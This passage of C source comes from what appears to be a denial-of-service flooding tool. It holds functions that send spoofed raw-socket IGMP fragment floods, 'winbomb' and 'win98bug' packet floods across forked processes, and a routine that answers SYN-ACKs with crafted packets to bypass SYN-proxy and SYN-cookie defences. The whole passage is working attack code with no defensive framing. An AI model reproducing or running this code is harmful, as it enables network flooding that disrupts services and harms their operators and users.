	ip->IPID	= htons(34717);
	ip->IPOFF	= htons(0x2000);
	ip->TTL	= 255;
	ip->PROTO	= IPPROTO_IGMP;
#ifdef RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	ip->SADDR	= htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#else
	ip->SADDR	= random();
#endif
	ip->DADDR	= glob_dst.sin_addr.s_addr;
	ip->IPSUM	= in_cksum((u_short *) ip, IPHDRSIZ);

	igmp->igmp_type	= 8;

	sendto(glob_sock, &packet, IGMPHDRSIZ + 1, 0, (struct sockaddr *) &glob_dst,
		sizeof(struct sockaddr));
	outcount++;

	ip->LEN		= htons(IGMPHDRSIZ + 8);
	ip->IPOFF	= htons(8 >> 3);
	ip->IPSUM	= in_cksum((u_short *) ip, IPHDRSIZ);

	sendto(glob_sock, &packet, IGMPHDRSIZ + 1, 0, (struct sockaddr *) &glob_dst,
		sizeof(struct sockaddr));
	outcount++;

	ip->LEN		= htons(IGMPHDRSIZ + 8);
	ip->IPOFF	|= htons(0x2000);
	ip->IPSUM	= in_cksum((u_short *) ip, IPHDRSIZ);

	igmp->igmp_type = 0;

	sendto(glob_sock, &packet, IGMPHDRSIZ + 8, 0, (struct sockaddr *) &glob_dst,
		sizeof(struct sockaddr));
	outcount++;
}


void
igmp_flood(void)
{
	int i;

#ifdef RANDOM_COUNTRY_SRC_IP
	load_country_ip();
#endif

	glob_dst.sin_port = htons(0);
	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			get_sock(&glob_sock, IPPROTO_RAW);
			srandom(time(NULL) ^ getpid());
			starttime = time(NULL);
			for (; ;)	send_igmp();
			/* NOTREACHED */
			exit(0);
		}
	}
}


void
winbomb_flood(void)
{
	int i;

#ifdef RANDOM_COUNTRY_SRC_IP
	load_country_ip();
#endif

	glob_dst.sin_port = htons(0);
	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			get_sock(&glob_sock, IPPROTO_RAW);
			srandom(time(NULL) ^ getpid());
			starttime = time(NULL);
			for (; ;)	send_winbomb();
			/* NOTREACHED */
			exit(0);
		}
	}
}


void
win98bug_flood(void)
{
	int i;

#ifdef RANDOM_COUNTRY_SRC_IP
	load_country_ip();
#endif

	glob_dst.sin_port = htons(0);
	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			get_sock(&glob_sock, IPPROTO_RAW);
			srandom(time(NULL) ^ getpid());
			starttime = time(NULL);
			for (; ;)	sendwin98bug();
			/* NOTREACHED */
			exit(0);
		}
	}
}


static int
create_send_socket(void)
{
	int sock_raw;

	sock_raw = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock_raw < 0)
		NS_ERR("%d:%s", errno, strerror(errno));
#ifdef HOLYBSD
	if (setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, "1", sizeof(int)))
#else
	if (setsockopt(sock_raw, SOL_IP, IP_HDRINCL, "1", sizeof(int)))
#endif
		NS_ERR("%d:%s", errno, strerror(errno));

	return sock_raw;
}


static int
create_receive_socket(void)
{
	int sock_raw;
#ifdef HOLYBSD
	sock_raw = socket(PF_INET, SOCK_DGRAM, htons(IPPROTO_IP));
#else
	sock_raw = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
#endif
	if (sock_raw < 0)
		NS_ERR("%d:%s", errno, strerror(errno));

	return sock_raw;
}


static void
tcpsum(void *buf, unsigned int len)
{
	int sum;
	IPHDR *iph = buf;
	struct tcphdr *tcph = (struct tcphdr *)(((unsigned char *) buf) +
				(iph->HL << 2));
	unsigned short *p = &tcph->TCPSPORT;

	sum = (iph->SADDR >> 16) + (iph->SADDR & 0xffff) + (iph->DADDR >> 16) +
		(iph->DADDR & 0xffff) + 1536 + htons(len - (iph->HL << 2));

	while (((unsigned int) p) < (((unsigned int) buf + len) - 1))
		sum += *p++;
	if (len & 0x01)
		sum += ((unsigned char *) buf)[len - 1];
	while (sum >> 16)
		sum = (sum >> 16) + (sum & 0xffff);

	tcph->TCPSUM = ~sum;
}


static void
send_syn(void)
{
	char buf[IPHDRSIZ + TCPHDRSIZ];
	IPHDR *iph = (IPHDR *) buf;
	struct tcphdr *tcph = (struct tcphdr *) (buf + TCPHDRSIZ);

	memset(&buf, 0, sizeof(buf));
	iph->VER = 4;
	iph->HL = IPHDRSIZ >> 2;
	iph->LEN = htons(sizeof(buf));
	iph->TTL = 64;
	iph->PROTO = IPPROTO_TCP;
	iph->DADDR = glob_dst.sin_addr.s_addr;
	iph->SADDR = glob_src.sin_addr.s_addr;
	arc4_crypt(&tcph->TCPSPORT, sizeof(tcph->TCPSPORT));
	tcph->TCPDPORT = glob_dst.sin_port;
	arc4_crypt(&tcph->TCPSEQ, sizeof(tcph->TCPSEQ));
	tcph->TCPOFF = TCPHDRSIZ >> 2;
	tcph->TCPWIN = htons(5840);
#ifdef HOLYBSD
	tcph->th_flags = TH_SYN;
#else
	tcph->syn = 1;
#endif
	tcpsum(buf, sizeof(buf));

	sendto(send_sock, &buf, sizeof(buf), MSG_NOSIGNAL,
		(struct sockaddr *) &glob_dst, sizeof(glob_dst));
}


static void
hack_syncook(struct tcphdr *ack)
{
	char buf[IPHDRSIZ + TCPHDRSIZ + 16];
	IPHDR *iph = (IPHDR *) buf;
	struct tcphdr *tcph = (struct tcphdr *)(buf + TCPHDRSIZ);
	int n;

	memset(&buf, 0, sizeof(buf));
	iph->VER = 4;
	iph->HL = IPHDRSIZ >> 2;
	iph->TTL = 64;
	iph->PROTO = IPPROTO_TCP;
	iph->DADDR = glob_dst.sin_addr.s_addr;
	iph->SADDR = glob_src.sin_addr.s_addr;
	tcph->TCPSPORT = ack->TCPDPORT;
	tcph->TCPDPORT = ack->TCPSPORT;
	tcph->TCPSEQ = ack->TCPACK;
	tcph->TCPACK = htonl(ntohl(ack->TCPSEQ) + 1);
	tcph->TCPOFF = TCPHDRSIZ >> 2;
	tcph->TCPWIN = htons(5840);
	n = (iph->HL << 2) + (tcph->TCPOFF << 2);
	n += snprintf(buf + n, sizeof(buf) - n, "allez schumi!");
	iph->LEN = htons(n);
#ifdef HOLYBSD
	tcph->th_flags = TH_PUSH | TH_ACK;
#else
	tcph->ack = 1;
	tcph->psh = 1;
#endif
	tcpsum(buf, n);

	sendto(send_sock, &buf, n, MSG_NOSIGNAL, (struct sockaddr *) &glob_dst,
		sizeof(glob_dst));
	outcount++;
}


void
bypass_synproxy(void)
{
	int ret, len;
	unsigned char arc4_buf[1024];
	unsigned char buf[1500];
	fd_set rdset;
	IPHDR *iph = (IPHDR *) buf;
	struct tcphdr *tcph;
	struct timespec till, cur;
	struct timeval to;

	get_local_addr();
	send_sock = create_send_socket();
	recv_sock = create_receive_socket();

	memcpy(arc4_buf, "&;4+^)", 6);
	arc4_set_key(arc4_buf, sizeof(arc4_buf));

	starttime = time(NULL);
	send_syn();

	clock_gettime(CLOCK_MONOTONIC, &till);
	till.tv_sec++;

	for (; ;) {
		FD_ZERO(&rdset);
		FD_SET(recv_sock, &rdset);
		clock_gettime(CLOCK_MONOTONIC, &cur);
		to.tv_sec = till.tv_sec - cur.tv_sec;
		to.tv_usec = till.tv_nsec - cur.tv_nsec;
		to.tv_usec /= 1000;
		while (to.tv_usec < 0) {
			to.tv_sec--;
			to.tv_usec += 1000000;
		}
		if (to.tv_sec < 0)
			memset(&to, 0, sizeof(to));
		ret = select(recv_sock + 1, &rdset, NULL, NULL, &to);
		if (ret < 0) {
			if (errno == EINTR)
				continue;
			NS_ERR("%d:%s", errno, strerror(errno));
		}
		if (ret == 0) {
			send_syn();
			clock_gettime(CLOCK_MONOTONIC, &till);
			till.tv_sec++;
			continue;
		}

		if (FD_ISSET(recv_sock, &rdset)) {
			len = read(recv_sock, buf, sizeof(buf));
			if (len < 0) {
				if (errno == EINTR)
					continue;
				NS_ERR("%d:%s", errno, strerror(errno));
			}

			if (iph->VER != 4 || iph->PROTO != IPPROTO_TCP
				|| iph->DADDR != glob_src.sin_addr.s_addr
				|| iph->SADDR != glob_dst.sin_addr.s_addr)
				continue;
			iph->LEN = ntohs(iph->LEN);
			if (len < iph->LEN)
				continue;
			len = iph->LEN;
			if (len < (int) ((iph->LEN << 2) + TCPHDRSIZ))
				continue;
			tcph = (struct tcphdr *) (buf + (iph->LEN << 2));
			if (tcph->TCPSPORT != glob_dst.sin_port ||
#ifdef HOLYBSD
				!(tcph->th_flags & TH_SYN) || !(tcph->th_flags & TH_ACK) ||
				(tcph->th_flags & TH_RST)  || (tcph->th_flags & TH_FIN)
#else
				tcph->syn == 0 || tcph->ack == 0 || tcph->rst || tcph->fin
#endif
			)
				continue;

			hack_syncook(tcph);
			send_syn();
			send_syn();
			send_syn();
			send_syn();
			send_syn();
		}
	}
}
